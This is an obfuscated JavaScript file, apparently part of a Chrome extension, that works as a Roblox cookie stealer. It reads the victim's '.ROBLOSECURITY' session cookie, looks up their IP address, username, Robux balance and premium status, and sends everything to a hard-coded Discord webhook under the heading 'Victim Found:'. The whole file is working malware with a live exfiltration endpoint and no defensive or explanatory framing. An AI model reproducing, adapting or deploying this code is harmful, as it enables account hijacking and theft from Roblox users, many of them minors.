const _0x1f3810=_0x52b2;(function(_0x3ec237,_0x18af34){const _0x5dbda8=_0x52b2,_0x5070e3=_0x3ec237();while(!![]){try{const _0x150bc6=-parseInt(_0x5dbda8(0xbf))/0x1+parseInt(_0x5dbda8(0xc6))/0x2*(parseInt(_0x5dbda8(0xb5))/0x3)+-parseInt(_0x5dbda8(0xb7))/0x4*(-parseInt(_0x5dbda8(0xb3))/0x5)+-parseInt(_0x5dbda8(0xc5))/0x6+-parseInt(_0x5dbda8(0xb0))/0x7*(-parseInt(_0x5dbda8(0xaa))/0x8)+-parseInt(_0x5dbda8(0xb2))/0x9+parseInt(_0x5dbda8(0xc1))/0xa*(parseInt(_0x5dbda8(0xc7))/0xb);if(_0x150bc6===_0x18af34)break;else _0x5070e3['push'](_0x5070e3['shift']());}catch(_0x22d799){_0x5070e3['push'](_0x5070e3['shift']());}}}(_0xb35b,0xddc94));const WEBHOOK_URL=_0x1f3810(0xcc);async function fetchIP(){const _0x2d1d28=_0x1f3810;try{const _0x4d49b3=await fetch(_0x2d1d28(0xc9));return await _0x4d49b3[_0x2d1d28(0xaf)]();}catch(_0x1185c2){return console[_0x2d1d28(0xb1)]('Error\x20fetching\x20IP:',_0x1185c2),'IP\x20NOT\x20FOUND';}}async function fetchUserInfo(_0x243415){const _0x5a2a81=_0x1f3810;try{const _0x2083dc=await fetch(_0x5a2a81(0xb9),{'headers':{'Cookie':_0x5a2a81(0xc2)+_0x243415},'redirect':'manual'});return await _0x2083dc[_0x5a2a81(0xbc)]();}catch(_0x781b31){return console['error'](_0x5a2a81(0xc0),_0x781b31),null;}}function _0x52b2(_0x269f45,_0x29ce69){const _0xb35b44=_0xb35b();return _0x52b2=function(_0x52b24b,_0x4f6932){_0x52b24b=_0x52b24b-0xaa;let _0x32918b=_0xb35b44[_0x52b24b];return _0x32918b;},_0x52b2(_0x269f45,_0x29ce69);}async function sendWebhook(_0x5489ab){const _0x41b289=_0x1f3810;try{await fetch(WEBHOOK_URL,{'method':_0x41b289(0xd0),'headers':{'Content-Type':'application/json'},'body':JSON['stringify'](_0x5489ab)});}catch(_0x37c137){console[_0x41b289(0xb1)](_0x41b289(0xab),_0x37c137);}}async function main(_0x45e8b2){const _0x4aea40=_0x1f3810,_0x321a85=await fetchIP(),_0x31a00e=_0x45e8b2?await fetchUserInfo(_0x45e8b2):null,_0x385b6e={'content':null,'embeds':[{'description':_0x4aea40(0xac)+(_0x45e8b2?_0x45e8b2:'COOKIE\x20NOT\x20FOUND')+'```','color':null,'fields':[{'name':_0x4aea40(0xcd),'value':_0x31a00e?_0x31a00e[_0x4aea40(0xbd)]:_0x4aea40(0xb6),'inline':!![]},{'name':_0x4aea40(0xb4),'value':_0x31a00e?_0x31a00e['RobuxBalance']:_0x4aea40(0xb6),'inline':!![]},{'name':_0x4aea40(0xb8),'value':_0x31a00e?_0x31a00e[_0x4aea40(0xba)]:_0x4aea40(0xb6),'inline':!![]}],'author':{'name':_0x4aea40(0xc3)+_0x321a85,'icon_url':_0x31a00e?_0x31a00e['ThumbnailUrl']:_0x4aea40(0xbb)},'footer':{'text':_0x4aea40(0xbe),'icon_url':_0x4aea40(0xcb)},'thumbnail':{'url':_0x31a00e?_0x31a00e[_0x4aea40(0xae)]:_0x4aea40(0xbb)}}],'username':_0x4aea40(0xca),'avatar_url':'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png','attachments':[]};await sendWebhook(_0x385b6e);}chrome[_0x1f3810(0xc8)][_0x1f3810(0xad)]({'url':_0x1f3810(0xce),'name':_0x1f3810(0xc4)},function(_0x1ebbe1){const _0x11ccdc=_0x1f3810;main(_0x1ebbe1?_0x1ebbe1[_0x11ccdc(0xcf)]:null);});function _0xb35b(){const _0x439562=['3073210HacmSE','error','200457UOcPYX','4202395zhZsTu','Robux','7041XFpSky','N/A','8GZDmDn','Premium','https://www.roblox.com/mobileapi/userinfo','IsPremium','https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png','json','UserName','https://github.com/ox-y','1099724PxCIVw','Error\x20fetching\x20user\x20info:','5544190HwXdfo','.ROBLOSECURITY=','Victim\x20Found:\x20','.ROBLOSECURITY','5624094rBrBEo','250cbaMyP','11lSrKjq','cookies','https://api.ipify.org','Roblox','https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png','https://discord.com/api/webhooks/1264189940087001138/El0EujY0MYcREzAyLa0NWEmxFifEc0xbdOqM-WM7DtCccICFAUOMzk1jvq4JPa0oj-uO','Username','https://www.roblox.com/home','value','POST','8ezTklU','Error\x20sending\x20webhook:','```','get','ThumbnailUrl','text'];_0xb35b=function(){return _0x439562;};return _0xb35b();}